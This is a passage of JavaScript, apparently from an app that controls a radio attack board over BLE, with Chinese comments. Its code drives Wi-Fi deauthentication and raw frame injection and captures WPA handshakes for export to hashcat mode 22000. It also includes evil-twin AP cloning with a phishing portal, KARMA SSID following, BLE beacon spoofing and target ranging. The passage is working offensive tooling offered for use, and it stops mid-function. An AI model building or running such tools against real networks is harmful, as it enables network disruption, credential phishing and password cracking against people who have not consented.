function waitCapRead(timeoutMs){
    return new Promise((resolve, reject) => {
        const wrapped = () => { clearTimeout(t); resolve(); };
        const t = setTimeout(() => {
            if (capReadWait === wrapped){ capReadWait = null; reject(new Error('拉取超时')); }
        }, timeoutMs);
        capReadWait = wrapped;
    });
}

function waitCapKeys(timeoutMs){
    return new Promise((resolve, reject) => {
        const t = setTimeout(() => { if (capKeysWait){ capKeysWait = null; reject(new Error('索引超时')); } }, timeoutMs);
        capKeysWait = { expect: 0, got: 0, done: (idx) => { clearTimeout(t); resolve(idx || []); } };
    });
}

async function capFetchKeys(){
    const p = waitCapKeys(6000);
    await nusWrite('cap keys');
    return await p;
}

/* 拉 [base, base+len) 这一段, 返回独立缓冲 */
async function capReadRange(base, len){
    const buf = new Uint8Array(len);
    capPull = { buf, base, total: len, recv: 0 };
    try {
        const CH = 2048;                       /* 与固件单片上限一致 */
        for (let o = 0; o < len; o += CH){
            const want = Math.min(CH, len - o);
            const p = waitCapRead(8000);
            await nusWrite('cap read ' + (base + o) + ' ' + want);
            await p;
            setCapProg(o + want, len, '拉取中');
        }
    } finally { capPull = null; }
    return buf;
}

async function capPullKeysPcap(){
    if (!connected){ toast('请先连接设备', 'err'); return; }
    cmdSending = true;                          /* 暂停命令队列, 免得插队 */
    try {
        setCapProg(0, 0, '读取关键帧索引');
        const idx = await capFetchKeys();
        if (!idx.length){
            setCapProg(0, 0, '没有关键帧');
            toast('没有关键帧 (EAPOL / PMKID / Deauth)', 'warn');
            return;
        }
        log('[落盘] 关键帧 ' + idx.length + ' 条, 开始分段拉取', 'meta');
        const show = Math.min(idx.length, 12);
        for (let i = 0; i < show; i++){
            const k = idx[i];
            log('[关键帧] #' + k.i + ' ' + capKindName(k.kind) + ' · CH ' + k.chan +
                ' · ' + k.rssi + ' dBm · ' + Math.round(k.ts / 1000) + 's', 'meta');
        }
        if (idx.length > show) log('[关键帧] 其余 ' + (idx.length - show) + ' 条略', 'meta');

        const parts = [await capReadRange(0, 24)];      /* pcap 全局头 */
        for (let i = 0; i < idx.length; i++){
            const k = idx[i];
            parts.push(await capReadRange(k.off, Math.min(k.len, 2048)));
            setCapProg(i + 1, idx.length, '拉取关键帧');
        }
        let total = 0;
        for (const p of parts) total += p.length;
        const out = new Uint8Array(total);
        let o = 0;
        for (const p of parts){ out.set(p, o); o += p.length; }

        await saveFile('rftool-keys-' + stamp() + '.pcap', out, 'application/vnd.tcpdump.pcap');
        setCapProg(total, total, '完成');
        log('[落盘] 关键帧 pcap: ' + idx.length + ' 条 / ' + fmtBytes(total), 'ok');
    } catch(e){
        setCapProg(0, 0, '失败');
        toast('拉取失败: ' + (e && e.message), 'err');
    } finally {
        capPull = null; capReadWait = null; capKeysWait = null;
        cmdSending = false;
        processCmdQueue();
    }
}

async function capDownloadFull(){
    const Cap = window.Capacitor;
    const Plug = (Cap && Cap.Plugins) || {};
    const FS = Plug.Filesystem, SH = Plug.Share;
    const url = 'http://' + boardIp + '/api/cap/pcap';
    const name = 'rftool-capture-' + stamp() + '.pcap';

    /* Android: 原生下载 (不经过 WebView, 也不受混合内容限制) */
    if (FS && FS.downloadFile){
        setCapProg(0, 0, '板载下载中');
        const res = await FS.downloadFile({ url, path: name, directory: 'CACHE' });
        log('[落盘] 完整 pcap 已取回: ' + (res.path || ''), 'ok');
        if (SH) await SH.share({ files: [res.path], dialogTitle: '保存完整 pcap' });
        else toast('已存入应用缓存', 'ok');
        setCapProg(0, 0, '完成');
        return;
    }

    /* 桌面浏览器: 直接 fetch */
    toast('正在下载…', 'warn');
    const r = await fetch(url);
    if (!r.ok) throw new Error('HTTP ' + r.status);
    const buf = new Uint8Array(await r.arrayBuffer());
    log('[落盘] 完整 pcap ' + fmtBytes(buf.length), 'ok');
    await saveFile(name, buf, 'application/vnd.tcpdump.pcap');
}

$('btnCapStart').addEventListener('click', () => {
    const kc = $('capKeyOnly');
    sendCmd('cap start' + (kc && kc.checked ? ' key' : ''));
});
$('btnCapStop').addEventListener('click', () => sendCmd('cap stop'));
$('btnCapRefresh').addEventListener('click', () => sendCmd('cap info'));
$('btnCapClear').addEventListener('click', () => sendCmd('cap clear'));
$('btnCapKeys').addEventListener('click', () => capPullKeysPcap());
$('btnCapFull').addEventListener('click', async () => {
    if (!httpRunning && !phishOn){
        toast('先启动板载 HTTP 服务 (数据页), 并让手机连上它的热点', 'warn');
        log('[落盘] 完整 pcap 需要板载服务: 数据页 → 板载 HTTP 服务 → 启动', 'warn');
        return;
    }
    try { await capDownloadFull(); }
    catch(e){ setCapProg(0, 0, '失败'); toast('下载失败: ' + (e && e.message), 'err'); }
});

/*
   EAPOL 握手归档 → hashcat 22000
 */
function updateHsUI(){
    const set = (id, v) => { const el = $(id); if (el) el.textContent = v; };
    set('hsTotal', String(hsSt.total));
    set('hsComplete', String(hsSt.complete));
    set('hsSeen', hsSt.seen.join('/'));
}

function fmtMac(hex){
    if (!hex || hex.length !== 12) return hex || '-';
    return hex.match(/../g).join(':');
}

function renderHsList(){
    const box = $('hsList');
    if (!box) return;
    if (!hsList.length){
        box.innerHTML = '<div class="line meta">暂无记录 · 先嗅探并 Deauth 目标, 或点刷新</div>';
        return;
    }
    box.innerHTML = hsList.map(h =>
        `<div class="line ${h.pair === 'none' ? 'meta' : 'ok'}">` +
        `${h.essid} · ${fmtMac(h.bssid)} · ${fmtMac(h.sta)} · CH${h.chan} ${h.rssi}dBm` +
        ` · pair=${h.pair} · msgs=0b${h.msgs.toString(2).padStart(5, '0')}</div>`
    ).join('');
    box.scrollTop = box.scrollHeight;
}

function waitHs(ms, what){
    return new Promise((resolve, reject) => {
        const t = setTimeout(() => {
            if (hsWait){ hsWait = null; reject(new Error(what + '超时')); }
        }, ms);
        hsWait = () => { clearTimeout(t); resolve(); };
    });
}

async function hsRefresh(){
    if (!connected) return;
    hsList = [];
    try {
        const p = waitHs(8000, '读取握手列表');
        await nusWrite('hs');
        await p;
    } catch(e){ toast(e.message, 'err'); }
}

async function hsExport22000(){
    if (!connected){ toast('请先连接设备', 'err'); return; }
    cmdSending = true;
    try {
        hsGrab = null;
        const p = waitHs(9000, '导出');
        await nusWrite('hs 22000');
        await p;
        const lines = (hsGrab && hsGrab.lines) || [];
        hsGrab = null;
        if (!lines.length){ toast('没有可用握手', 'warn'); return; }
        await saveFile('rftool-' + stamp() + '.hc22000', lines.join('\n') + '\n', 'text/plain');
        log('[握手] 已导出 ' + lines.length + ' 条 → hashcat -m 22000', 'ok');
    } catch(e){
        hsGrab = null;
        toast('导出失败: ' + (e && e.message), 'err');
    } finally {
        cmdSending = false;
        processCmdQueue();
    }
}

$('btnHsRefresh').addEventListener('click', () => hsRefresh());
$('btnHsExport').addEventListener('click', () => hsExport22000());
$('btnHsClear').addEventListener('click', () => sendCmd('hs clear'));

/*
   Stage 3: Evil Twin / KARMA / 原始帧构造器
 */
function renderKarma(){
    const box = $('karmaList');
    if (!box) return;
    if (!karmaList.length){
        box.innerHTML = '<div class="line meta">暂无 · 先嗅探一会儿，客户端会主动报出它在找哪些网络</div>';
        return;
    }
    box.innerHTML = karmaList.map(k =>
        `<div class="line ${k.hits > 2 ? 'ok' : 'meta'}">${k.hits}× ${k.ssid} · ${k.rssi}dBm</div>`
    ).join('');
    box.scrollTop = box.scrollHeight;
}

/* BLE 近邻设备列表 (按信号降序) */
function renderBleDev(){
    const box = $('bledevList');
    if (!box) return;
    const cntEl = $('bleCount2');
    if (!bleDevList.length){
        box.innerHTML = '<div class="list-empty">' +
            (bleScanning ? '扫描中… 暂时没发现设备' : '暂无 · 点「开始扫描」') + '</div>';
        if (cntEl) cntEl.textContent = bleScanning ? '扫描中…' : '0 个设备';
        return;
    }
    const sorted = [...bleDevList].sort((a, b) => b.rssi - a.rssi);
    box.innerHTML = '';
    for (let i = 0; i < sorted.length; i++){
        const d = sorted[i];
        const rssiIcon = d.rssi > -60 ? '▰' : d.rssi > -80 ? '▱' : '▯';
        const item = document.createElement('div');
        item.className = 'list-item';
        item.style.animationDelay = (i * 20) + 'ms';
        item.innerHTML =
            `<div class="ic">${rssiIcon}</div>` +
            `<div class="nm">` +
              `<div class="ssid">${d.name && d.name !== '-' ? d.name : '(未命名设备)'}</div>` +
              `<div class="meta"><span>${d.addr}</span></div>` +
            `</div>` +
            `<div class="rssi">${d.rssi} dBm</div>`;
        item.addEventListener('click', () => copyText(d.addr));
        box.appendChild(item);
    }
    if (cntEl) cntEl.textContent = bleDevList.length + ' 个设备' + (bleScanning ? ' · 扫描中' : '');
}

/* BLE 扫描是设备端持续进行的, App 侧定期轮询 blescan 拉最新列表即可实时刷新 */
function startBlePoll(){
    if (blePollTimer) clearInterval(blePollTimer);
    blePollTimer = setInterval(() => { if (bleScanning) sendCmd('blescan'); }, 2000);
}
function stopBlePoll(){
    if (blePollTimer){ clearInterval(blePollTimer); blePollTimer = null; }
}
function bleScanStart(){
    if (!connected){ toast('请先连接设备', 'err'); return; }
    if (bleScanning){ toast('扫描进行中', 'warn'); return; }
    bleScanning = true;
    bleDevList = [];
    renderBleDev();
    radar('bleRadar2', true);
    bleScanState('扫描中…');
    log('开始 BLE 扫描…', 'warn');
    toast('正在扫描 BLE…', 'warn');
    expectConfirm('BLE 扫描', 6000);
    sendCmd('blescan start');
    startBlePoll();
    /* 60s 自动停, 避免长时间占用射频 */
    setTimeout(() => { if (bleScanning) bleScanStop(true); }, 60000);
}
function bleScanStop(silent){
    if (!bleScanning && !silent) { /* 仍允许发 stop 清理设备端 */ }
    bleScanning = false;
    stopBlePoll();
    radar('bleRadar2', false);
    bleScanState(bleDevList.length ? ('完成 · ' + bleDevList.length + ' 个设备') : '已停止');
    renderBleDev();
    sendCmd('blescan stop');
    if (!silent) log('停止 BLE 扫描', 'warn');
}

function evilTwin(push){
    if (!selectedAp){ toast('请先在嗅探页选一个目标 AP', 'warn'); return; }
    /* 起 AP + 起 DNS + 起 HTTP, 慢于普通命令, 给 12s */
    expectConfirm('克隆', 12000);
    sendCmd('eviltwin clone ' + selectedAp.bssid.replace(/:/g, '') + (push ? ' push' : '') + ' --yes');
}

function rawPreset(kind){
    if (!selectedAp){ toast('请先选一个目标 AP', 'warn'); return; }
    const b = selectedAp.bssid.replace(/:/g, '');
    const name = (selectedAp.ssid && selectedAp.ssid !== '(hidden)') ? selectedAp.ssid : 'TestAP';
    if (kind === 'deauth')         sendCmd('raw deauth ' + b);
    else if (kind === 'auth')      sendCmd('raw auth ' + b);
    else if (kind === 'beacon')    sendCmd('raw beacon ' + name + ' ' + selectedAp.channel);
    else if (kind === 'proberesp') sendCmd('raw proberesp ' + name + ' ' + selectedAp.channel);
}

$('btnEtClone').addEventListener('click', () => evilTwin(false));
$('btnEtClonePush').addEventListener('click', () => evilTwin(true));
$('btnEtStop').addEventListener('click', () => sendCmd('eviltwin stop'));
$('btnKarmaRefresh').addEventListener('click', () => { karmaList = []; sendCmd('karma'); });
$('btnKarmaClear').addEventListener('click', () => sendCmd('karma clear'));
$('btnRawTx').addEventListener('click', () => {
    const h = ($('rawHex').value || '').trim();
    if (!h){ toast('请输入 HEX', 'warn'); return; }
    sendCmd('raw tx ' + h);
});
$('btnRawDeauth').addEventListener('click', () => rawPreset('deauth'));
$('btnRawAuth').addEventListener('click', () => rawPreset('auth'));
$('btnRawBeacon').addEventListener('click', () => rawPreset('beacon'));
$('btnRawProbeResp').addEventListener('click', () => rawPreset('proberesp'));

/* 点 KARMA 列表任意一行 = 把门户改名成那个 SSID */
$('karmaList').addEventListener('click', e => {
    const line = e.target.closest('.line');
    if (!line || !line.parentNode) return;
    const idx = Array.prototype.indexOf.call(line.parentNode.children, line);
    if (idx >= 0 && karmaList[idx]) sendCmd('karma follow ' + karmaList[idx].i);
});

$('btnBleScanStart').addEventListener('click', () => bleScanStart());
$('btnBleScanStop').addEventListener('click', () => bleScanStop(false));
$('btnBleScanRefresh').addEventListener('click', () => {
    if (!connected){ toast('请先连接设备', 'err'); return; }
    bleScanState('读取设备端列表…');
    sendCmd('blescan');
});
$('btnBleScanClear').addEventListener('click', () => {
    bleDevList = [];
    renderBleDev();
    bleScanState('已清空（设备端同步清除）');
    sendCmd('blescan clear');
});

renderBleDev();

renderKarma();

updateHsUI();
renderHsList();

updateCapUI();

/* 工具台初始渲染 */
updateAdvUI();
updateZbUI();
renderZbList();
renderFtmApSelect();
setBlePowerUI(15);

/* 开发者模式开关 */
function setDevMode(on){
    devMode = !!on;
    const btn = $('btnDevMode');
    if (btn) btn.classList.toggle('on', devMode);
}
$('btnDevMode').addEventListener('click', () => {
    setDevMode(!devMode);
    if (devMode){
        log('[调试] 开发者模式已开启 - 详细 BLE 调试日志将输出', 'ok');
        toast('调试模式已开启', 'ok');
    } else {
        log('开发者模式已关闭', 'meta');
    }
});

/* 一键复制日志 */
$('btnCopyLog').addEventListener('click', async () => {
    const text = [...logBox.querySelectorAll('.line')].map(l => l.textContent).join('\n');
    if (!text){ toast('日志为空', 'warn'); return; }
    try {
        await navigator.clipboard.writeText(text);
        toast('日志已复制到剪贴板 (' + text.length + ' 字)', 'ok');
    } catch(e){
        /* 兜底: 用临时 textarea */
        const ta = document.createElement('textarea');
        ta.value = text; ta.style.position='fixed'; ta.style.opacity='0';
        document.body.appendChild(ta); ta.select();
        try { document.execCommand('copy'); toast('日志已复制', 'ok'); }
        catch(e2){ toast('复制失败, 请手动选择', 'err'); }
        document.body.removeChild(ta);
    }
});

/*
   工具台 (Tools): BLE 伪装 / FTM 测距 / 802.15.4 嗅探 / 发射功率
 */

/* 通用校验 / 小工具 */
function confirmDanger(msg){
    try { return window.confirm(msg); } catch(e){ return true; }
}
function isMac(s){
    return /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/i.test(s) || /^[0-9a-f]{12}$/i.test(s);
}
/* UUID -> 归一化 32 位小写 hex; 非法返回 null */
function normUuid(s){
    const h = (s || '').replace(/[-:\s]/g, '').toLowerCase();
    return /^[0-9a-f]{32}$/.test(h) ? h : null;
}
function markValid(inputId, ok){
    const el = $(inputId);
    if (el) el.classList.toggle('inval', !ok);
    return ok;
}
function clampInt(v, lo, hi, def){
    let n = parseInt(v);
    if (isNaN(n)) n = def;
    return Math.max(lo, Math.min(hi, n));
}

/* A1: BLE 广播伪造 (bleadv) */
function advTypeZh(t){
    return t === 'ibeacon' ? 'iBeacon' : t === 'eddystone' ? 'Eddystone' : '未运行';
}
function startAdvTick(){
    if (advTick) clearInterval(advTick);
    advTick = setInterval(() => {
        if (advSt.remain > 0) advSt.remain--;
        if (advSt.remain <= 0){
            advSt.active = false;
            stopAdvTick();
            advSt.link = '已恢复';
            log('[BLE 伪装] 时长结束，自动停止', 'warn');
            toast('BLE 伪装已结束', 'warn');
        }
        updateAdvUI();
    }, 1000);
}
function stopAdvTick(){ if (advTick){ clearInterval(advTick); advTick = null; } }
function updateAdvUI(){
    setText(['advState'], advSt.active ? '伪造中' : '空闲');
    setText(['advType'], advTypeZh(advSt.type));
    setText(['advRemain'], advSt.active ? (advSt.remain + ' s') : '--');
    setText(['advLink'], advSt.link || '--');
    const msg = $('advMsg');
    if (!msg) return;
    if (advSt.active){
        msg.textContent = '进行中 · ' + advTypeZh(advSt.type) +
            (advSt.dur ? ' · 剩余 ' + advSt.remain + 's' : '') +
            ' · 已建立的连接保持, 但期间不可被新设备连接';
    } else if (advNoAck){
        msg.textContent = '未收到回执: 可能因广播切换导致链路短暂阻塞, 或连接已中断。' +
            '停止后固件会自动恢复连接广播; 若已断连请重新连接设备。';
    } else {
        msg.textContent = '未开始';
    }
}
document.querySelectorAll('#advSeg [data-adv]').forEach(b => {
    b.addEventListener('click', () => {
        advMode = b.dataset.adv;
        document.querySelectorAll('#advSeg [data-adv]').forEach(x => x.classList.toggle('on', x === b));
        const ib = $('advIbeacon'), ed = $('advEddystone');
        if (ib) ib.classList.toggle('hidden', advMode !== 'ibeacon');
        if (ed) ed.classList.toggle('hidden', advMode !== 'eddystone');
    });
});
$('advStart').addEventListener('click', () => {
    if (!connected){ toast('请先连接设备', 'err'); return; }
    const sec = clampInt($('advSec').value, 1, 3600, 30);
    $('advSec').value = sec;
    let cmd;
    if (advMode === 'ibeacon'){
        const uuid = normUuid($('advUuid').value);
        if (!uuid){
            markValid('advUuid', false);
            toast('UUID 需为 32 位十六进制', 'err');
            return;
        }
        markValid('advUuid', true);
        const major = clampInt($('advMajor').value, 0, 65535, 0);
        const minor = clampInt($('advMinor').value, 0, 65535, 0);
        $('advMajor').value = major; $('advMinor').value = minor;
        cmd = 'bleadv ibeacon ' + uuid + ' ' + major + ' ' + minor + ' ' + sec;
    } else {
        const url = ($('advUrl').value || '').trim();
        if (!url){ markValid('advUrl', false); toast('请输入 Eddystone URL', 'err'); return; }
        markValid('advUrl', true);
        cmd = 'bleadv eddystone ' + url + ' ' + sec;
    }
    advNoAck = false;
    advSt = { active:false, type:advMode, remain:sec, dur:sec, link:'启动中' };
    updateAdvUI();
    log('[BLE 伪装] 请求开始 ' + advMode + ' · ' + sec + 's', 'warn');
    toast('正在启动 BLE 伪装…', 'warn');
    if (advAck) clearTimeout(advAck);
    advAck = setTimeout(() => {
        advAck = null;
        if (!advSt.active){
            advNoAck = true;
            advSt.link = '可能已中断';
            updateAdvUI();
            log('[BLE 伪装] 未收到回执，广播切换可能阻塞了链路, 或连接已中断; 停止后会自动恢复连接广播', 'err');
            toast('未收到回执，连接可能已中断', 'err');
        }
    }, 6000);
    sendCmd(cmd);
});
$('advStop').addEventListener('click', () => {
    if (!connected){ toast('请先连接设备', 'err'); return; }
    if (!confirmDanger('停止 BLE 广播伪造？停止后固件会自动恢复连接广播。')) return;
    sendCmd('bleadv stop');
    advSt.active = false; advSt.remain = 0; advSt.link = '已恢复'; advNoAck = false;
    stopAdvTick(); updateAdvUI();
    toast('已请求停止', 'warn');
});
$('advStatus').addEventListener('click', () => sendCmd('bleadv status'));
$('advUuid').addEventListener('input', () => {
    const v = ($('advUuid').value || '').trim();
    if (!v){ $('advUuid').classList.remove('inval'); return; }
    markValid('advUuid', !!normUuid(v));
});

/* A2: FTM 真实测距 (ftm) */
function ftmStatusZh(s){
    switch (s){
        case 'SUCCESS':       return '成功';
        case 'UNSUPPORTED':   return '目标 AP 不支持 802.11mc 测距';
        case 'CONF_REJECTED': return '目标拒绝了测距参数协商';
        case 'NO_RESPONSE':   return '目标未响应测距请求';
        case 'NO_VALID_MSMT': return '未获得有效测量结果';
        case 'USER_TERM':     return '会话被中止';
        case 'FAIL':          return '测距失败';
        default:              return s || '未知';
    }
}
function renderFtmApSelect(){
    const sel = $('ftmApSelect');
    if (!sel) return;
    const cur = sel.value;
    sel.innerHTML = '<option value="">— 手动输入 —</option>' +
        apList.map(a => `<option value="${a.bssid}">${a.ssid} · ${a.bssid} · CH${a.channel}</option>`).join('');
    const want = cur || (selectedAp && selectedAp.bssid);
    if (want && apList.some(a => a.bssid === want)) sel.value = want;
}
function renderFtmBursts(){
    const box = $('ftmBurstBox');
    if (!box) return;
    if (!ftmBursts.length){
        box.innerHTML = '<div class="line meta">无 burst 明细</div>';
        return;
    }
    box.innerHTML = ftmBursts.map(b => {
        /* rtt(ps) -> 单程距离(cm) ≈ rtt_ps × c / 2, c = 3e10 cm/s → rtt_ps × 0.015 */
        const cm = b.rtt * 0.015;
        return `<div class="line ${b.rssi >= -60 ? 'ok' : 'meta'}">burst ${b.i}` +
               ` · ${b.rssi} dBm · rtt ${b.rtt} ps · ≈ ${cm.toFixed(1)} cm</div>`;
    }).join('');
}
function renderFtmResult(){
    const box = $('ftmResult');
    if (!box) return;
    box.style.display = 'block';
    const okr = ftmSt.status === 'SUCCESS';
    setText(['ftmDist'], okr ? ftmSt.distM.toFixed(2) : '--');
    setText(['ftmDistCm'], okr ? ('≈ ' + ftmSt.distCm + ' cm') : '');
    setText(['ftmStatus'], ftmSt.status || '--');
    setText(['ftmStatusCode'], String(ftmSt.code));
    setText(['ftmRttEst'], ftmSt.rttEst ? (ftmSt.rttEst + ' ns') : '--');
    setText(['ftmRttRaw'], ftmSt.rttRaw ? (ftmSt.rttRaw + ' ns') : '--');
    setText(['ftmPeer'], ftmSt.peer || '--');
    setText(['ftmEntries'], String(ftmSt.entries));
    setText(['ftmState'], okr ? ('完成 · ' + ftmSt.distM.toFixed(2) + ' m')
                              : ('失败 · ' + ftmStatusZh(ftmSt.status)));
    const ex = $('ftmExplain');
    if (ex){
        ex.textContent = okr
            ? '802.11mc FTM 会话成功, 距离由 RTT 换算（含一定误差, 适合粗定位 / 接近检测）。'
            : ftmStatusZh(ftmSt.status) + '。可换一个支持 802.11mc 的 AP, 或靠近目标后重试。';
    }
    renderFtmBursts();
}
$('ftmApSelect').addEventListener('change', () => {
    const v = $('ftmApSelect').value;
    if (!v) return;
    $('ftmBssid').value = v;
    const ap = apList.find(a => a.bssid === v);
    if (ap && ap.channel) $('ftmCh').value = ap.channel;
    markValid('ftmBssid', true);
});
$('ftmBssid').addEventListener('input', () => {
    const v = ($('ftmBssid').value || '').trim();
    if (!v){ $('ftmBssid').classList.remove('inval'); return; }
    markValid('ftmBssid', isMac(v));
});
$('ftmRun').addEventListener('click', () => {
    if (!connected){ toast('请先连接设备', 'err'); return; }
    const bssid = ($('ftmBssid').value || '').trim();
    if (!bssid){ markValid('ftmBssid', false); toast('请选择或输入目标 BSSID', 'err'); return; }
    if (!isMac(bssid)){ markValid('ftmBssid', false); toast('BSSID 格式非法', 'err'); return; }
    markValid('ftmBssid', true);
    let ch  = clampInt($('ftmCh').value, 0, 177, 0);
    const cnt = parseInt($('ftmCount').value || '0') || 0;
    /* 固件不接受 channel=0 (回 ESP_ERR_INVALID_ARG 258)。
     * 用户没填就用当前目标的信道。 */
    if (ch === 0 && selectedAp && selectedAp.channel) ch = parseInt(selectedAp.channel, 10) || 0;
    let cmd = 'ftm range ' + bssid;
    if (ch > 0) cmd += ' ' + ch;
    else if (cnt > 0) cmd += ' 0';
    if (cnt > 0) cmd += ' ' + cnt;
    ftmSt = { peer:bssid, status:'', code:0, distCm:0, distM:0, rttEst:0, rttRaw:0, entries:0 };
    ftmBursts = [];
    const res = $('ftmResult'); if (res) res.style.display = 'none';
    setBtnLoading('ftmRun', true);
    setText(['ftmState'], '测距中…（固件最长等 6 秒）');
    log('[FTM] 开始测距 ' + bssid + (ch ? (' CH' + ch) : '') + (cnt ? (' · burst ' + cnt) : ''), 'warn');
    toast('正在测距…', 'warn');
    sendCmd(cmd);
    if (ftmWait) clearTimeout(ftmWait);
    ftmWait = setTimeout(() => {
        ftmWait = null;
        setBtnLoading('ftmRun', false);
        setText(['ftmState'], '超时 · 未收到报告');
        log('[FTM] 超时（>8s 未收到报告）', 'err');
        toast('FTM 超时', 'err');
    }, 8000);
});

/* A3: 802.15.4 / Zigbee / Thread 嗅探 (zbsniff) */
function startZbPoll(){
    if (zbPoll) clearInterval(zbPoll);
    zbPoll = setInterval(() => { if (zbSt.on) sendCmd('zbsniff status'); }, 2500);
}
function stopZbPoll(){ if (zbPoll){ clearInterval(zbPoll); zbPoll = null; } }
/* 逐帧到达时批量渲染, 避免每帧重建整个列表 (最多 512 帧) */
function scheduleZbRender(){
    if (zbRenderTimer) return;
    zbRenderTimer = setTimeout(() => { zbRenderTimer = null; renderZbList(); }, 180);
}
function updateZbUI(){
    setText(['zbState'], zbSt.on ? '嗅探中' : '空闲');
    setText(['zbChNow'], zbSt.ch ? String(zbSt.ch) : '--');
    setText(['zbTotal'], String(zbSt.total));
    setText(['zbFrames'], String(zbSt.frames));
    setText(['zbDrops'], String(zbSt.drops));
    setText(['zbCap'], zbSt.cap ? String(zbSt.cap) : '--');
    const m = $('zbMsg');
    if (!m) return;
    if (zbSt.on){
        m.textContent = '嗅探中 · CH' + zbSt.ch + ' · 累计 ' + zbSt.total + ' 帧 / 丢弃 ' + zbSt.drops +
            ' · 802.15.4 与 Wi-Fi 互斥, 期间 Wi-Fi 作业已停';
    } else {
        m.textContent = zbList.length
            ? ('已停止 · 界面列表 ' + zbList.length + ' 帧')
            : '未开始';
    }
}
function renderZbList(){
    const box = $('zbList');
    if (!box) return;
    if (!zbList.length){
        box.innerHTML = '<div class="list-empty">暂无抓包 · 点「开始」抓帧, 再点「读取帧」拉取界面列表</div>';
        setText(['zbCount'], '0 帧');
        return;
    }
    const shown = zbList.slice(0, ZB_SHOW_MAX);
    box.innerHTML = '';
    for (let k = 0; k < shown.length; k++){
        const f = shown[k];
        const item = document.createElement('div');
        item.className = 'list-item';
        const full = f.hex || '';
        const short = full.length > 56 ? full.slice(0, 56) + '…' : full;
        item.innerHTML =
            `<div class="ic">${f.i}</div>` +
            `<div class="nm">` +
              `<div class="meta"><span>len ${f.len}</span><span>${f.rssi} dBm</span>` +
              `<span>LQI ${f.lqi}</span><span>CH ${f.ch}</span></div>` +
              `<div class="zhex" data-open="0">${short}</div>` +
            `</div>`;
        const z = item.querySelector('.zhex');
        z.dataset.full = full;
        z.dataset.short = short;
        item.addEventListener('click', () => {
            const isFull = z.dataset.open === '1';
            z.textContent = isFull ? z.dataset.short : z.dataset.full;
            z.dataset.open = isFull ? '0' : '1';
        });
        box.appendChild(item);
    }
    if (zbList.length > shown.length){
        const more = document.createElement('div');
        more.className = 'list-empty';
        more.textContent = '界面仅显示前 ' + shown.length + ' 帧 / 共 ' + zbList.length + ' 帧';
        box.appendChild(more);
    }
    setText(['zbCount'], zbList.length + ' 帧');
}
$('zbStart').addEventListener('click', () => {
    if (!connected){ toast('请先连接设备', 'err'); return; }
    const ch = parseInt($('zbCh').value || '0') || 0;
    if (ch < 11 || ch > 26){ toast('信道需在 11-26', 'err'); return; }
    zbSt.on = true; zbSt.ch = ch; zbSt.total = 0; zbSt.frames = 0; zbSt.drops = 0;
    zbList = []; zbExpect = -1;
    renderZbList(); updateZbUI(); radar('zbRadar', true);
    startZbPoll();
    log('[802.15.4] 请求开始 CH' + ch, 'warn');
    toast('启动 802.15.4 嗅探…', 'warn');
    sendCmd('zbsniff ' + ch);
});
$('zbStop').addEventListener('click', () => {
    if (!connected){ toast('请先连接设备', 'err'); return; }
    sendCmd('zbsniff stop');
    zbSt.on = false; stopZbPoll(); radar('zbRadar', false); updateZbUI();
    toast('已请求停止', 'warn');
});
$('zbRefresh').addEventListener('click', () => sendCmd('zbsniff status'));
$('zbDump').addEventListener('click', () => {
    if (!connected){ toast('请先连接设备', 'err'); return; }
    zbExpect = -1; zbList = [];
    renderZbList();
    log('[802.15.4] 读取帧表…', 'warn');
    sendCmd('zbsniff dump');
});
$('zbClear').addEventListener('click', () => {
    if (!connected){ toast('请先连接设备', 'err'); return; }
    if (!confirmDanger('清空设备端 802.15.4 抓包表？此操作不可撤销。')) return;
    sendCmd('zbsniff clear');
    zbList = []; zbExpect = -1; zbSt.total = 0; zbSt.frames = 0; zbSt.drops = 0;
    renderZbList(); updateZbUI();
    toast('已请求清空', 'warn');
});

/* A4: BLE 发射功率 (ble power) */
/* 索引→dBm: 0..14 线性 (level-8)*3, level 15 例外 = +20 (与固件一致) */
function blePwrDbm(lv){
    return (lv < 0) ? -99 : (lv === 15 ? 20 : (lv - 8) * 3);
}
function setBlePowerUI(lv){
    blePowerLv = lv;
    const r = $('blePwrRange');
    if (r) r.value = String(lv);
    setText(['blePwrVal'], String(lv));
    setText(['blePwrLevel'], String(lv));
    setText(['blePwrDbm'], blePwrDbm(lv) + ' dBm');
}
$('blePwrRange').addEventListener('input', () => {
    const lv = parseInt($('blePwrRange').value) || 0;
    setText(['blePwrVal'], String(lv));
    setText(['blePwrLevel'], String(lv));
    setText(['blePwrDbm'], blePwrDbm(lv) + ' dBm (未应用)');
});
$('blePwrApply').addEventListener('click', () => {
    if (!connected){ toast('请先连接设备', 'err'); return; }
    const lv = parseInt($('blePwrRange').value) || 0;
    log('[BLE 功率] 设置 level ' + lv + '…', 'warn');
    toast('正在设置功率 level ' + lv, 'warn');
    sendCmd('ble power ' + lv);
});
$('blePwrQuery').addEventListener('click', () => sendCmd('ble power'));

/*
   状态轮询 (每 3 秒)
 */
function startStatusPoll(){
    stopStatusPoll();
    statusTimer = setInterval(() => { if (connected) sendCmd('status'); }, 3000);

    /* 链路看门狗: 固件重启或射频被作业占死时, GATT 连接可能还挂着但收不到任何数据.
     * 12 秒没有任何字节就主动探测, 连探 3 次都没回应就按断线处理, 走重连流程. */
    clearInterval(linkWatchTimer);
    linkWatchTimer = setInterval(() => {
        if (!connected) { linkDeadProbes = 0; return; }
        const idle = Date.now() - linkLastRx;
        if (idle < 12000) { linkDeadProbes = 0; return; }
        if (linkDeadProbes >= 3){
            log('链路 12 秒无响应, 判定断线并重连', 'err');
            onDisconnect();
            return;
        }
        linkDeadProbes++;
        dlog('链路空闲 ' + Math.round(idle/1000) + 's, 探测 ' + linkDeadProbes + '/3');
        sendCmd('status');
    }, 4000);
}
function stopStatusPoll(){
    if (statusTimer){ clearInterval(statusTimer); statusTimer = null; }
    if (linkWatchTimer){ clearInterval(linkWatchTimer); linkWatchTimer = null; }
}

/*
   背景粒子动画 (后台暂停)
 */
(function(){
    const canvas = $('bg');
    const ctx = canvas.getContext('2d');
    let W, H, particles = [], dpr, animId = null, visible = true;

    function resize(){
        dpr = Math.min(window.devicePixelRatio || 1, 2);
        W = canvas.width = window.innerWidth * dpr;
        H = canvas.height = window.innerHeight * dpr;
        canvas.style.width = window.innerWidth + 'px';
        canvas.style.height = window.innerHeight + 'px';
    }
    resize();
    window.addEventListener('resize', resize);

    document.addEventListener('visibilitychange', () => {
        visible = !document.hidden;
        if (visible && !animId) tick();
    });

    for (let i=0; i<80; i++){
        particles.push({
            x: Math.random()*W, y: Math.random()*H,
            vx: (Math.random()-0.5)*0.25, vy: (Math.random()-0.5)*0.25,
